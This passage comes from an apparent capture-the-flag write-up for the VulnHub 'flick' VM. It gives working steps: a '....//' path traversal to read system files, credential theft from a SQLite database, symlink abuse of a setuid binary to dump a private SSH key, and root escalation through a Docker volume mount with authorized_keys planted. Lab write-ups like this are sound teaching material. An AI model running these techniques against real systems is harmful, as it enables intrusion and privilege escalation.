I assumed there was some basic filtering going on, so I tried a different approach: ....//....//....//....//etc/passwd

![](/images/2014-08-14/9.png)

Hey it worked! From the passwd file I identified two users on the target; robin and dean. I spent a good amount of time enumerating the target as much as I could, and one of the more helpful clues came from /etc/apache2/services-enabled/000-default

![](/images/2014-08-14/10.png)

This revealed the website's DocumentRoot at /var/www/flick_photos. I remembered the web application was using Laravel, which I wasn't familiar with. After a bit of Googling, I found Laravel on [GitHub](https://github.com/andrewelkins/Laravel-4-Bootstrap-Starter-Site/), and that allowed me to see the Laravel structure. After looking around, I identified a couple of interesting directories; app/config and app/database.

I was able to pull down app/database/production.sqlite from the target. I didn't even have to load it up using sqlite3 as the dump actually displayed the table and fields:

![](/images/2014-08-14/11.png)

I clicked on the Hex tab and was able to more clearly read the contents of the SQLite database. From here I could see the usernames and passwords. 

![](/images/2014-08-14/12.png)

A quick copy and paste, and I had the passwords for robin and dean.

```
robin: JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1
dean : FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA
```

I attempted to SSH into the server with these newly found credentials. The password for robin didn't work, but the password for dean did, and I finally had a shell on the target. 

```
# ssh dean@172.16.229.158
.
.
.
dean@172.16.229.158's password: 
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Thu Aug 14 23:37:51 SAST 2014

  System load:  0.0               Processes:              86
  Usage of /:   35.8% of 6.99GB   Users logged in:        0
  Memory usage: 50%               IP address for eth0:    172.16.229.158
  Swap usage:   0%                IP address for docker0: 172.17.42.1

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Sat Aug  2 14:42:15 2014 from 192.168.56.1
dean@flick:~$
```

There were two interesting files in dean's home directory; message.txt and read_docker. message.txt contained the following:

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Hi Dean,

I will be away on leave for the next few weeks. I have asked the admin guys to
write a quick script that will allow you to read my .dockerfile for flick-
a-photo so that you can continue working in my absense.

The .dockerfile is in my home, so the path for the script will be something like
/home/robin/flick-dev/

Please call me if you have any troubles!

- --
Ciao
Robin
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBAgAGBQJT32ZsAAoJENRCTh/agc2DTNIP/0+ut1jWzk7VgJlT6tsGB0Ah
yi24i2b+JAVtINzCNgJ+rXUStaAEudTvJDF28b/wZCaFVFoNJ8Q30J03FXo4SRnA
ZW6HZZIGEKdlD10CcXsQrLMRmWZlBDQnCm4+EMOvavS1uU9gVvcaYhnow6uwZlwR
enf71LvtS1h0+PrFgSIoItBI4/lx7BiYY9o3hJyaQWkmAZsZLWQpJtROe8wsxb1l
9o4jCJrADeJBsYM+xLExsXaEobHfKtRtsM+eipHXIWIH+l+xTi8Y1/XIlgEHCelU
jUg+Hswq6SEch+1T5B+9EPoeiLT8Oi2Rc9QePSZ3n0fe4f3WJ47lEYGLLEUrKNG/
AFLSPnxHTVpHNO72KJSae0cG+jpj1OKf3ErjdTk1PMJy75ntQCrgtnGnp9xvpk0b
0xg6cESLGNkrqDGopsN/mgi6+2WKtUuO5ycwVXFImY3XYl+QVZgd/Ntpu4ZjyZUT
lxqCAk/G1s43s+ySFKSoHZ8c/CuOKTsyn6uwI3NxBZPD04xfzoc0/R/UpIpUmneK
q9LddBQK4vxPab8i4GNDiMp+KXyfByO864PtKQnCRkGQewanxoN0lmjB/0eKhkmf
Yer1sBmumWjjxR8TBY3cVRMH93zpIIwqxRNOG6bnnSVzzza5DJuNssppCmXLOUL9
nZAuFXkGFu6cMMD4rDXQ
=2moZ
-----END PGP SIGNATURE-----
```

The script being referred to in the message was the read_docker binary. Running this and passing /home/robin/flick-dev output the following:

```
dean@flick:~$ ./read_docker /home/robin/flick-dev
# Flick-a-photo dev env
RUN apt-get update && apt-get install -y php5 libapache2-mod-php5 php5-mysql php5-cli && apt-get clean && rm -rf /var/lib/apt/lists/*

CMD ["/usr/sbin/apache2", "-D", "FOREGROUND"]
```

run_docker had the setuid bit set and was owned by the user robin. This allowed it to read the contents of the Docker file in robin's directory, even though the directory only had read/write/execute permissions for robin. 

I wondered what I could do with this. I downloaded the binary and examined it in gdb but didn't find vulnerabilities. read_docker was basically reading the contents of /home/robin/flick-dev/Dockerfile, but I could pass it any directory I wanted, so long as it had a Dockerfile in it. Could I read other files in /home/robin if I created symbolic links to it? 

```
dean@flick:~$ ln -s /home/robin/.profile Dockerfile
dean@flick:~$ file Dockerfile 
Dockerfile: broken symbolic link to `/home/robin/.profile'
dean@flick:~$ ./read_docker /home/dean
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
	. "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi
```

It worked! The file command identified Dockerfile as a broken symbolic link since dean had no read permissions to /home/robin, but that didn't stop read_docker from displaying the contents of the file. First thing I decided to try to read was /home/robin/.ssh/id_rsa, assuming that it existed.  

It did.

```
dean@flick:~$ ln -s /home/robin/.ssh/id_rsa Dockerfile
dean@flick:~$ ./read_docker /home/dean
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAlv/0uKdHFQ4oT06Kp3yg0tL1fFVl4H+iS1UOqds0HrgBCTSw
ECwVwhrIFJa/u5FOPGst8t35CKo4VWX3KNHXFNVtUXWeQFpe/rB/0wi+k8E8WtXi
FBjLiFOqTDL0kgXRoQzUPlYg0+LAXo5EbMq+rB2ZgMJTxunJFV2m+uKtbZZRvzU6
S1Fj6XHh/U0E68d6sZ/+y1UhSJLaFYUQMkfLtjxPa17sPZ+kwB1R4puhVTprfQOk
CinfW01ot2Rj2HLMR5CpgA28dmxw8W6w0MGtXurTegj1ydFOTgB1/k4XpXnSGNO9
d2AlVR/NsKDAuYKdgRGFFh91nGZTl1p4em48YwIDAQABAoIBADI3bwhVwSL0cV1m
jmAC520VcURnFhlh+PQ6lkTQvHWW1elc10yZjKbfxzhppdvYB/+52S8SuPYzvcZQ
wbCWkIPCMrfLeNSH+V2UDv58wvxaYBsJVEVAtbdhs5nhvEovmzaHELKmbAZrO3R2
tbTEfEK7GUij176oExKC8bwv1GND/qQBwLtEJj/YVJSsdvrwroCde+/oJHJ76ix4
Ty8sY5rhKYih875Gx+7IZNPSDn45RsnlORm8fd5EGLML6Vm3iLfwkHIxRdj9DFoJ
wJcPX7ZWTsmyJLwoHe3XKklz2KW185hIr9M2blMgrPC2ZuTnvBXmEWuy86+xxAB0
mFXYMdkCgYEAx6yab3huUTgTwReaVpysUEqy4c5nBLKqs6eRjVyC9jchQfOqo5AQ
l8bd6Xdrk0lvXnVkZK0vw2zwqlk8N/vnZjfWnCa4unnv2CZXS9DLaeU6gRgRQFBI
JB+zHyhus+ill4aWHitcEXiBEjUHx4roC7Al/+tr//cjwUCwlHk75F0CgYEAwZhZ
gBjAo9X+/oFmYlgVebfR3kLCD4pVPMz+HyGCyjSj0+ddsHkYiHBhstBtHh9vU+Pn
JMhrtR9yzXukuyQr/ns1mhEQOUtTaXrsy/1FyRBaISrtcyGAruu5yWubT0gXk2Dq
rwyb6M6MbnwEMZr2mSBU5l27cTKypFqgcA58l78CgYAWM5vsXxCtGTYhFzXDAaKr
PtMLBn8v54nRdgVaGXo6VEDva1+C1kbyCVutVOjyNI0cjKMACr2v1hIgbtGiS/Eb
zYOgUzHhEiPX/dNhC7NCcAmERx/L7eFHmvq4sS81891NrtpMOnf/PU3kr17REiHh
AtIG1a9pg5pHJ6E6sQw2xQKBgHXeqm+BopieDFkstAeglcK8Fr16a+lGUktojDis
EJPIpQ65yaNOt48qzXEv0aALh57OHceZd2qZsS5G369JgLe6kJIzXWtk325Td6Vj
mX+nwxh6qIP2nADkaQOnzrHgtOn4kiruRGbki0AhpfQF46qrssVnwF5Vfcrvmstf
JqDFAoGBAI9KJamhco8BBka0PUWgJ3R2ZqE1viTvyME1G25h7tJb17cIeB/PeTS1
Q9KMFl61gpl0J4rJEIakeGpXuehwYAzNBv7n6yr8CNDNkET/cVhp+LCmbS91FwAK
VP0mqDppzOZ04B9FQD8Af6kUzxzGFH8tAN5SNYSW88I9Z8lVpfkn
-----END RSA PRIVATE KEY-----
```

Armed with robin's private SSH key, I copied it over to my machine as robin_id_rsa, changed the permissions so that it was read only, and logged in to the target as user robin.

```
# ssh -i robin_id_rsa robin@172.16.229.158
.
.
.
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Thu Aug 14 23:50:47 SAST 2014

  System load:  0.0               Processes:              89
  Usage of /:   35.8% of 6.99GB   Users logged in:        1
  Memory usage: 52%               IP address for eth0:    172.16.229.158
  Swap usage:   0%                IP address for docker0: 172.17.42.1

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Sat Aug  2 12:43:16 2014 from 192.168.56.1
robin@flick:~$ 
```

As it turned out, robin had the ability to run at least one command using sudo:

```
robin@flick:~$ sudo -l
Matching Defaults entries for robin on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User robin may run the following commands on this host:
    (root) NOPASSWD: /opt/start_apache/restart.sh
```

Unfortunately I had no read access to this file so I had no idea what it was doing. I noticed that robin's PATH environment variable included /home/robin/bin which didn't exist. I made the assumption that perhaps /opt/start_apache/restart.sh would call some command that didn't have the absolute path specified, and so it would run something in /home/robin/bin instead. So I made copies of every command in /bin that contained a simple command to echo "w00t" if it got executed.

Sadly this was not the case. So I turned my attention to [Docker](https://www.docker.com/), another application I was not familiar with. [Wikipedia](http://en.wikipedia.org/wiki/Docker_\(software\)) described Docker as: 

> Docker is an open-source project that automates the deployment of applications inside software containers, providing that way an additional layer of abstraction and automatization of operating system–level virtualization on Linux.

Fascinating. After ruffling through Docker's manuals and discussions related to Docker on various forums, I learned that I could issue commands that would run in the container. 

First, I was able to identify an image called ubuntu. 

```
robin@flick:~$ docker ps -l
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                   PORTS               NAMES
b0f71c63a88c        ubuntu:14.04        /bin/bash           11 days ago         Exited (0) 11 days ago                       sharp_shockley  
```

Next, I was able to run commands in this image as root:

```
robin@flick:~$ docker run ubuntu id
uid=0(root) gid=0(root) groups=0(root)
```

Unfortunately each command would cause the image to exit, and the contents of the image were quite different from the host OS. For example, users robin and dean didn't exist:

```
robin@flick:~$ docker run ubuntu ls -l /home
total 0
```

Looking in /root in the image also showed that it was empty. 

```
robin@flick:~$ docker run ubuntu ls -l /root
total 0
```

Fortunately, I discovered that it was possible to mount the host OS's /root directory into the image's /root directory. This allowed me to access the contents of the host OS's /root and give me an interactive shell on the image: 

```
robin@flick:~$ docker run -t -i -v /root:/root ubuntu /bin/bash
root@ae6c944aba5e:/# ls -l /root
total 8
drwxr-xr-x 2 root root 4096 Aug  1 14:53 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
-rw-r--r-- 1 root root   67 Aug  1 14:52 flag.txt
root@ae6c944aba5e:/# 
```

Fantastic! There was a directory 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc in /root, and of course, /root/flag.txt. This flag.txt file was actually a fake flag:

```
root@28cedba12d4b:/root# cat /root/flag.txt 
Errr, you are close, but this is not the flag you are looking for.
```

Ok, there was still the directory. Looking at its contents showed another file called real_flag.txt:

```
root@28cedba12d4b:/root# ls -l /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/
total 4
-rw-r--r-- 1 root root 128 Aug  1 14:53 real_flag.txt
```

Reading this showed a congratulatory message!

```
root@28cedba12d4b:/root# cat /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt 
Congrats!

You have completed 'flick'! I hope you have enjoyed doing it as much as I did creating it :)

ciao for now!
@leonjza
```

Got the flag, but I still didn't have root on the host OS. To remedy this, I just copied my SSH keys into /root/.ssh. Since this was basically the host OS's /root directory I was writing to, I could now SSH into the server as root:

```
root@28cedba12d4b:/root# mkdir .ssh
root@28cedba12d4b:/root# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC20qgWGJOGR4hVnD+dJlVnq2M3a1d/QzMBLItZ1WY/qGap1budvBn+X27HkW2HhN6MEmShQzNjG7oNSNOwQBGVBaK/p8Z4Kh2m0QmKS1j+q1cexWGfRPenkDvhvDWdROXdhyQfXovz5xuoKTeuJHygQeTHRfz0tRsEuY4l/ws6S0rqOCb8OvyVmnZbcovBbDxl+6q3y5Vh3UNmSPKFcZ0X1dGeEM1Zq0DJXQfUljR+sYd1qOToc59U5Ul/ZS1qkUqwrJWvlcJGlTjoFFwBJI4hVHd1hDiog0FX8STEyp9HS8XQC16oQKWjcbV0M3fDo9OFFFDarY5VqOBnrcKo1OSt root@kali' > .ssh/authorized_keys
root@28cedba12d4b:/root# chmod 700 .ssh && chmod 600 .ssh/authorized_keys
root@28cedba12d4b:/root# exitrobin@flick:~$ exit
logout
Connection to 172.16.229.158 closed.

root@kali ~/flick
# ssh root@172.16.229.158
.
.
.                                          
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Fri Aug 15 00:25:30 SAST 2014

  System load:  0.0               Processes:              95
  Usage of /:   35.8% of 6.99GB   Users logged in:        1
  Memory usage: 53%               IP address for eth0:    172.16.229.158
  Swap usage:   0%                IP address for docker0: 172.17.42.1

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Wed Aug  6 07:02:18 2014 from 192.168.56.1
root@flick:~# id
uid=0(root) gid=0(root) groups=0(root)
root@flick:~# 
```

Done and done! I had a lot of fun with this one and learned a bit more about Docker along the way. Thanks to leonjza for a great challenge, and to VulnHub for hosting it!
